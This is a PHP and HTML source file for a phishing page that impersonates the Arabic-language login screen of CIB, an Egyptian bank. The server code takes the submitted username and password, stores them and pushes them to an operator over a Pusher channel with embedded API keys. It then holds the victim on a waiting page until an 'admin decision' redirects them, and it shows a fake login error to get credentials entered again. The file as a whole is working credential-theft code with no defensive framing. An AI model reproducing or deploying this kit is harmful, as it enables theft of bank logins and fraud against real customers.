<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
    'f8499dfcc5db13fb4153',
    '212f55cd103ef936b3f3',
    '2151243',
    $options
);

    $site = array(
        'username' => $_POST['username'],
        'password' => $_POST['password'],
        'message' => 'login',
        'page' => 'login.php',
        'type' => '1'
    );

    $userId = $_SESSION['user_id'];
    $id = $User->UpdateAccount($userId, $site);
    if ($id) {

        $dataUser = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);

        echo "<script>document.location.href='waitaccount.php';</script>";
        exit;
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CIB - تسجيل الدخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        /* Top bar */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 20px 12px;
            border-bottom: 1px solid #f1f5f9;
        }

        .top-bar img {
            height: 36px;
            object-fit: contain;
        }

        .lang-btn {
            border: 1.5px solid #e2e8f0;
            border-radius: 99px;
            padding: 6px 14px;
            font-size: 13px;
            color: #475569;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            background: #f8fafc;
            font-family: 'Cairo', sans-serif;
            font-weight: 500;
            transition: all 0.2s;
        }

        .lang-btn:hover {
            border-color: #1a5ca8;
            color: #1a5ca8;
        }

        /* Hero */
        .hero-section {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 32px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .hero-section::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -40%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
        }

        .hero-title {
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            position: relative;
            z-index: 1;
        }

        .hero-sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-top: 4px;
            position: relative;
            z-index: 1;
        }

        /* Form */
        .form-area {
            padding: 28px 24px 16px;
            flex: 1;
        }

        .field-group {
            margin-bottom: 20px;
        }

        .field-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }

        .field-input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            color: #1a2332;
            font-family: 'Cairo', sans-serif;
            background: #f8fafc;
            outline: none;
            transition: all 0.25s;
            direction: rtl;
        }

        .field-input::placeholder {
            color: #94a3b8;
        }

        .field-input:focus {
            border-color: #1a5ca8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }

        .password-wrap {
            position: relative;
        }

        .password-wrap .field-input {
            padding-left: 44px;
        }

        .eye-btn {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            color: #94a3b8;
            transition: color 0.2s;
        }

        .eye-btn:hover {
            color: #1a5ca8;
        }

        .forgot {
            display: block;
            text-align: left;
            color: #1a5ca8;
            font-size: 13px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 24px;
            margin-top: -4px;
            transition: color 0.2s;
        }

        .forgot:hover {
            color: #0d3b6e;
        }

        /* Login error */
        .login-error {
            display: none;
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .login-error {
            display: none;
        }

        .login-error.show {
            display: flex;
        }

        .login-error span {
            color: #991b1b;
            font-size: 13px;
            font-weight: 600;
        }

        /* Buttons */
        .login-row {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .btn-login {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: not-allowed;
            transition: all 0.3s;
            color: #fff;
            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
        }

        .btn-login.active {
            background: linear-gradient(135deg, #1a5ca8, #2563eb);
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
        }

        .btn-login.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
        }

        .btn-bio {
            background: #fff;
            border: 1.5px solid #1a5ca8;
            border-radius: 12px;
            width: 60px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            padding: 10px 6px;
            transition: all 0.2s;
            flex-shrink: 0;
        }

        .btn-bio:hover {
            background: #eef3fb;
        }

        .bio-divider {
            width: 1px;
            height: 22px;
            background: #c5d3e8;
            flex-shrink: 0;
        }

        .register-line {
            text-align: center;
            font-size: 14px;
            color: #64748b;
            margin-bottom: 16px;
        }

        .register-line a {
            color: #1a5ca8;
            font-weight: 700;
            text-decoration: none;
        }

        /* Footer */
        .version {
            text-align: center;
            font-size: 12px;
            color: #94a3b8;
            padding: 12px 0;
        }

        .contact-bar {
            background: linear-gradient(135deg, #00b5c9, #0891b2);
            padding: 13px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 7px;
        }

        .contact-bar .cb-text {
            color: #fff;
            font-size: 13px;
        }

        .contact-bar a {
            color: #fff;
            font-size: 13px;
            font-weight: 700;
            text-decoration: none;
        }

        .bottom-nav {
            background: linear-gradient(135deg, #1a5ca8, #0d3b6e);
            padding: 14px 6px 16px;
            display: flex;
            justify-content: space-around;
            align-items: flex-start;
        }

        .nav-item {
            text-align: center;
            cursor: pointer;
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        .nav-item span {
            color: #fff;
            font-size: 10px;
            line-height: 1.4;
            display: block;
            opacity: 0.85;
        }

        /* Security */
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 12px 0;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        /* Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        #loadingOverlay.show {
            display: flex;
        }

        .loader-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .loader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #1a5ca8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        .loader-card h5 {
            color: #1a2332;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .loader-card p {
            color: #64748b;
            font-size: 13px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .page-wrapper {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <div class="top-bar">
            <img src="assets/logo.webp" alt="CIB" />
            <button class="lang-btn">
                <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                    <polyline points="1,4 6,9 11,4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
                العربية
            </button>
        </div>

        <div class="hero-section">
            <div class="hero-title">تسجيل الدخول</div>
            <div class="hero-sub">أدخل بيانات حسابك للمتابعة</div>
        </div>

        <div class="form-area">
            <form method="POST" action="" id="loginForm">
                <div class="field-group">
                    <label class="field-label">اسم المستخدم</label>
                    <input class="field-input" id="usernameInput" name="username" type="text"
                        placeholder="أدخل اسم المستخدم" />
                </div>
                <div class="field-group">
                    <label class="field-label">كلمة المرور</label>
                    <div class="password-wrap">
                        <input class="field-input" id="passwordInput" name="password" type="password"
                            placeholder="أدخل كلمة المرور" />
                        <button class="eye-btn" onclick="togglePass()" type="button" tabindex="-1">
                            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none"
                                stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                <circle cx="12" cy="12" r="3" />
                            </svg>
                        </button>
                    </div>
                </div>
                <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>

                <?php if (isset($showError)): ?>
                    <div class="login-error show">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>خطأ في اسم المستخدم أو كلمة المرور</span>
                    </div>
                <?php endif; ?>

                <div class="login-row">
                    <button class="btn-login" id="loginBtn" type="submit" name="submit" disabled>تسجيل الدخول</button>
                    <button class="btn-bio" type="button">
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1a5ca8" stroke-width="1.65"
                            stroke-linecap="round" stroke-linejoin="round">
                            <path d="M7 3H5a2 2 0 0 0-2 2v2" />
                            <path d="M17 3h2a2 2 0 0 1 2 2v2" />
                            <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
                            <path d="M17 21h2a2 2 0 0 0 2-2v-2" />
                            <line x1="9" y1="10" x2="9" y2="10.01" stroke-width="2.5" />
                            <line x1="15" y1="10" x2="15" y2="10.01" stroke-width="2.5" />
                            <path d="M12 10v2.5" />
                            <path d="M9.5 15.5c.7 1 1.5 1.5 2.5 1.5s1.8-.5 2.5-1.5" />
                        </svg>
                        <div class="bio-divider"></div>
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1a5ca8" stroke-width="1.65"
                            stroke-linecap="round" stroke-linejoin="round">
                            <path d="M17 8c0-2.76-2.24-5-5-5S7 5.24 7 8" />
                            <path d="M12 9c-1.1 0-2 .9-2 2v2c0 2 1 3.5 2 4.5 1-1 2-2.5 2-4.5v-2c0-1.1-.9-2-2-2z" />
                        </svg>
                    </button>
                </div>

                <p class="register-line">مستخدم جديد؟ <a href="#">سجل الآن</a></p>

                <div class="security-note">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    </svg>
                    <span>بياناتك محمية بتشفير 256-bit SSL</span>
                </div>
            </form>
        </div>

        <div class="version">إصدار التطبيق 3.1.5</div>

        <div class="contact-bar">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
                <path
                    d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.61 21 3 13.39 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.26.2 2.47.57 3.6.1.34.02.72-.24.98L6.6 10.8z" />
            </svg>
            <span class="cb-text">تحتاج إلى مساعدة؟</span>
            <a href="#">اتصل بنا</a>
        </div>

        <div class="bottom-nav">
            <div class="nav-item">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7">
                    <circle cx="12" cy="10" r="3" />
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
                </svg>
                <span>الفروع وماكينات الصراف</span>
            </div>
            <div class="nav-item">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7">
                    <polyline points="20 12 20 22 4 22 4 12" />
                    <rect x="2" y="7" width="20" height="5" rx="1" />
                    <line x1="12" y1="22" x2="12" y2="7" />
                </svg>
                <span>مكافأة CIB</span>
            </div>
            <div class="nav-item">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8">
                    <line x1="3" y1="8" x2="21" y2="8" />
                    <polyline points="17,4 21,8 17,12" />
                    <line x1="21" y1="16" x2="3" y2="16" />
                    <polyline points="7,12 3,16 7,20" />
                </svg>
                <span>أسعار الصرف</span>
            </div>
        </div>
    </div>

    <div id="loadingOverlay">
        <div class="loader-card">
            <div class="loader-spinner"></div>
            <h5>جاري التحقق</h5>
            <p>يرجى الانتظار...</p>
        </div>
    </div>

    <script>
        function checkFields() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            const valid = user.length > 0 && pass.length > 0;
            btn.disabled = !valid;
            btn.classList.toggle('active', valid);
        }

        function togglePass() {
            const inp = document.getElementById('passwordInput');
            const icon = document.getElementById('eyeIcon');
            if (inp.type === 'password') {
                inp.type = 'text';
                icon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>`;
            } else {
                inp.type = 'password';
                icon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('usernameInput').addEventListener('input', checkFields);
            document.getElementById('passwordInput').addEventListener('input', checkFields);

            document.getElementById('loginForm').addEventListener('submit', function (e) {
                const user = document.getElementById('usernameInput').value.trim();
                const pass = document.getElementById('passwordInput').value.trim();
                if (!user || !pass) { e.preventDefault(); return; }
                document.getElementById('loadingOverlay').classList.add('show');
            });
        });
    </script>
    <!-- Pusher for routing -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userId = <?php echo $_SESSION['user_id'] ?? 0; ?>;
        if (userId > 0) {
            var pusher = new Pusher('f8499dfcc5db13fb4153', { 
    cluster: 'ap2' 
});
            var channel = pusher.subscribe('my-channel-cib');
            channel.bind('admin-decision', function (data) {
                if (data.userId == userId) window.location = data.url;
            });
        }
    </script>
</body>

</html>